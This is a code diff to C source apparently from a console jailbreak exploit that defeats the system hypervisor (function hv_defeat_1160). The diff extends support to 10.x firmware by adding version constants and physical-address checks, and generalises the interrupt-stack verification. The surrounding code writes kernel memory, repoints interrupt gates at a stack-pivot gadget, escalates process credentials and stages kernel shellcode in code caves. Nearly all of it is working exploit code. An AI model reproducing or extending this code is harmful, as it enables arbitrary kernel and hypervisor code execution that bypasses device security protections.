@@ -27,6 +27,11 @@
 #define FW_1100_RAW 0x11000043U
 #define FW_1120_RAW 0x11200005U
 #define FW_1140_RAW 0x11400005U
+#define FW_1000_RAW 0x10000046U
+#define FW_1001_RAW 0x10010000U
+#define FW_1020_RAW 0x10200006U
+#define FW_1040_RAW 0x10400007U
+#define FW_1060_RAW 0x10600006U
 #define FW_1160_RAW 0x11600005U
 #define NCPU 16
 #define TSS_STRIDE 0x68ULL
@@ -126,17 +131,31 @@ static int offsets_present(void) {
   case 0x1100: expected_raw = FW_1100_RAW; break;
   case 0x1120: expected_raw = FW_1120_RAW; break;
   case 0x1140: expected_raw = FW_1140_RAW; break;
+  case 0x1000: expected_raw = FW_1000_RAW; break;
+  case 0x1001: expected_raw = FW_1001_RAW; break;
+  case 0x1020: expected_raw = FW_1020_RAW; break;
+  case 0x1040: expected_raw = FW_1040_RAW; break;
+  case 0x1060: expected_raw = FW_1060_RAW; break;
   case 0x1160: expected_raw = FW_1160_RAW; break;
   default: return 0;
   }
   if (kernel_get_fw_version() != expected_raw)
     return 0;
-  /* Every 11.x build shares the same hypervisor image and CC cave. */
-  if (env_offset.HV_CODE_CAVE_PA != 0x62806F00ULL ||
-      env_offset.HV_HANDLE_VMEXIT_PA != 0x62847551ULL)
+  /* Every 10.x/11.x build shares the same hypervisor image and CC cave. */
+  if (env_offset.HV_CODE_CAVE_PA != 0x62806F00ULL)
     return 0;
-  if (env_offset.KERNEL_CODE_CAVE != 0xD2B000ULL ||
-      env_offset.DATA_CAVE != 0x2D02000ULL)
+  if (fw >= 0x1000 && fw < 0x1050) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x62847488ULL)
+      return 0;
+  } else if (fw == 0x1060) {
+    if (env_offset.HV_HANDLE_VMEXIT_PA != 0x628474A8ULL)
+      return 0;
+  } else if (env_offset.HV_HANDLE_VMEXIT_PA != 0x62847551ULL) {
+    return 0;
+  }
+  if (fw >= 0x1100 &&
+      (env_offset.KERNEL_CODE_CAVE != 0xD2B000ULL ||
+       env_offset.DATA_CAVE != 0x2D02000ULL))
     return 0;
   for (size_t i = 0; i < sizeof(required) / sizeof(required[0]); i++)
     if (required[i] == 0)
@@ -213,14 +232,15 @@ static void gate_encode(uint64_t target, uint16_t selector, uint8_t ist,
   *hi = (target >> 32) & 0xffffffffULL;
 }
 
-static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU]) {
+static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU],
+                             int db_ist) {
   uint64_t rsp0[NCPU];
   uint64_t ist4[NCPU];
 
   for (int cpu = 0; cpu < NCPU; cpu++) {
     uint64_t base = tss_base + (uint64_t)cpu * TSS_STRIDE;
     rsp0[cpu] = kread64(base + 0x04);
-    ist4[cpu] = kread64(base + TSS_IST(4));
+    ist4[cpu] = kread64(base + TSS_IST(db_ist));
     saved[cpu] = kread64(tss_ist_slot(tss_base, cpu, 6));
     if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0 || saved[cpu] != 0)
       return -1;
@@ -431,9 +451,18 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   if (break_hv_bin_len == 0 || break_hv_bin_len > sizeof(staged) ||
       kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0)
     return -1;
-  if (!((saved_gate_lo >> 47) & 1) || ((saved_gate_lo >> 32) & 7) != 4 ||
-      verify_tss_layout(tss_base, saved_ist))
-    return -2;
+  {
+    int gate_p = (int)((saved_gate_lo >> 47) & 1);
+    int gate_ist = (int)((saved_gate_lo >> 32) & 7);
+    int tss_rc = (gate_p && gate_ist >= 1 && gate_ist <= 7)
+                     ? verify_tss_layout(tss_base, saved_ist, gate_ist)
+                     : -1;
+    if (!gate_p || gate_ist < 1 || gate_ist > 7 || tss_rc) {
+      notify("%04x arm gate: lo=0x%llx P=%d ist=%d tss=%d\n", fw,
+             (unsigned long long)saved_gate_lo, gate_p, gate_ist, tss_rc);
+      return -2;
+    }
+  }
 
   gate_encode(kg(env_offset.GAD_PIVOT_ADD_RSP28_RET),
               (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
@@ -498,12 +527,12 @@ static int arm_startup_carrier(uint64_t resume_cave) {
                                    STACK_TOP_OFF;
     if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want) {
       if (restore_ists(tss_base, saved_ist)) {
-        notify("11.60 IST6 rollback readback failed; cold reboot required\n");
+        notify("%04x IST6 rollback readback failed; cold reboot required\n", fw);
         return -10;
       }
       kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE, 0);
       if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
-        notify("11.60 carrier-state rollback failed; cold reboot required\n");
+        notify("%04x carrier-state rollback failed; cold reboot required\n", fw);
         return -10;
       }
       return -9;
@@ -554,28 +583,35 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   int rc;
 
   if (shellcode_kernel == NULL || !offsets_present()) {
-    notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
+    notify("%04x offsets/raw firmware gate failed; refusing to arm\n", fw);
+    notify("gate diag: raw=0x%08x handler_pa=0x%llx cave_pa=0x%llx "
+           "code_cave=0x%llx data_cave=0x%llx\n",
+           (unsigned)kernel_get_fw_version(),
+           (unsigned long long)env_offset.HV_HANDLE_VMEXIT_PA,
+           (unsigned long long)env_offset.HV_CODE_CAVE_PA,
+           (unsigned long long)env_offset.KERNEL_CODE_CAVE,
+           (unsigned long long)env_offset.DATA_CAVE);
     return -1;
   }
   if (validate_wake_cave(shellcode_kernel_len)) {
-    notify("11.60 wake blob/cave mapping validation failed\n");
+    notify("%04x wake blob/cave mapping validation failed\n", fw);
     return -1;
   }
 
   facs = kread64(kg(env_offset.ACPIGBL_FACS));
   if ((facs >> 48) != 0xffffULL) {
-    notify("11.60 AcpiGbl_FACS validation failed; refusing to arm\n");
+    notify("%04x AcpiGbl_FACS validation failed; refusing to arm\n", fw);
     return -1;
   }
 
   kernel_set_ucred_authid(getpid(), 0x4800000000000007ULL);
   if (pin_to_tss0() || sceKernelGetCurrentCpu() != 15) {
-    notify("11.60 could not pin scheduler CPU 15 / TSS slot zero\n");
+    notify("%04x could not pin scheduler CPU 15 / TSS slot zero\n", fw);
     return -1;
   }
 
   if (walk_page(dmap + AP_PAYLOAD_PAGE, 1)) {
-    notify("11.60 startup-AP carrier page is not executable\n");
+    notify("%04x startup-AP carrier page is not executable\n", fw);
     return -1;
   }
 
@@ -588,7 +624,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   resume_cave = kg(env_offset.DATA_CAVE);
   if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0) {
-    notify("11.60 resume carrier has stale state; cold reboot required\n");
+    notify("%04x resume carrier has stale state; cold reboot required\n", fw);
     return -1;
   }
   kwrite(resume_cave + CAVE_ORACLE_OFF, zeroes, sizeof(zeroes));
@@ -596,7 +632,7 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   rc = arm_startup_carrier(resume_cave);
   if (rc) {
-    notify("11.60 startup-AP carrier refused to arm (%d)\n", rc);
+    notify("%04x startup-AP carrier refused to arm (%d)\n", fw, rc);
     return -1;
   }
 
